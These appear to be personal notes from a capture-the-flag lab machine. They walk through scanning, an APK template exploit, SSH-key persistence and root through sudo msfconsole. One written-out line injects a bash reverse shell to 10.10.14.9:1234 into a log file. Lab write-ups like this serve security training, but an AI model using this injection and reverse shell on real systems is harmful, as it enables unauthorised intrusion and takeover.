# Takeaways
- You can get a more stable shell by generating SSH keys and setting up access that way
- ANY program can be vulnerable...

# Process
- First, a lazy nmap scan.

![[e8b987b7210537933c108bb12c2324be-1.png]]

- Then, since this seemed interesting, I looked up "Werkzeug" on searchsploit and attempted to use the exploit (but it failed)

![[7076159459806a5e20072c7970a386a7-1.png]]

![[840a1e4e818842b9e9cd75654b7b9c03-1.png]]

![[339781ef213207d2c23b9fe4313eacc0-1.png]]

![[67c898ba071b2aad5050e54289ad0c06-1.png]]

- Running dirb

![[d80757406e2f614d543dee4c3a51c0b3-1.png]]

- Visiting the website at 10.10.10.226:5000

![[89aa1c2b43744cc3f0b0d06175a6af2a-1.png]]

![[3a6452aa7759382943fe1a8858a518d4-1.png]]

- I thought the searchsploit one was interesting, since there may be some bash injection possible, so I tried `nada ; echo hi` as the parameter and got: 

![[7b18ffd50c943111a1e5da3ae5a4657b-1.png]]

- Well, it seems that this is blacklisted, but could there be other ways to say the same thing? 

- Maybe the server is vulnerable to CVE-2020-7834?

![[3583fb3d6a035f8a738b3955e96bd8f6-1.png]]

- Generating the malicious apk template

![[7c9e959a579f6a2d4d2f15dfb0604518-1.png]]

- Listening for connections on 4444 and uploading msf.apk and generating an msfvenom payload from the web app (thus triggering the exploit)

![[16640991c3db5038848f507113dac9f1-1.png]]

![[0e6392e986ee0b98577019529537c56e-1.png]]

- Upgrading the primitive shell to a working python TTY

![[709cf59e26bc12be6369ed53e842808f-1.png]]

- Using Linpeas

![[0056af37ea59cf1c0b737d9582bde363-1.png]]

- could it be metasploit? not sure.

![[51a10f741709c65c8f4fc50d79ce858b-1.png]]

- Before going any further, I decided to generate SSH keys on Kali and transfer the public key over to the target machine (appending the content to ~/.ssh/authorized_keys) to enable SSH login for stability.

- However, there is an interesting script in the `/home/pwn` directory...

![[6d1edd889f87abf18c1f20ebe0482124-1.png]]


- Looking at the logs directory for the `hackers` file, the permissions seems off. ('kid' can write to it and perform injection, maybe?)

![[14544d0ef61a128988d0eea2ab5d74d2-1.png]]

- So first, start a netcat listener as always. 

![[41efc84fac784d4421b4e9d6d32d7f32-1.png]]

- The payload I used to modify the `hackers` file was the following. It simply opens a reverse shell to the IP and PORT. 

```sh
echo "  ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.9/1234 0>&1' #" >> ~/logs/hackers
```

- Finally!

![[7223fb6a91357ffa0e348ed1460e03d6-1.png]]

- Or not...

![[b32ede66634ba7d33385a35682664569-1.png]]

- So, we need to privilege escalate again...but luckily, it's pretty basic. `sudo -l` reveals something interesting.

![[dda7d13028181ced734f61872ea09466-1.png]]

- We can sudo to msfconsole with no password. And msfconsole is running at root permissions, so we will essentially be root!

![[8a9a953c1017bbf2df70c056b76e3743-1.png]]

![[16267fbbcc6283c773ac890fde42626c-1.png]]

- Pwned!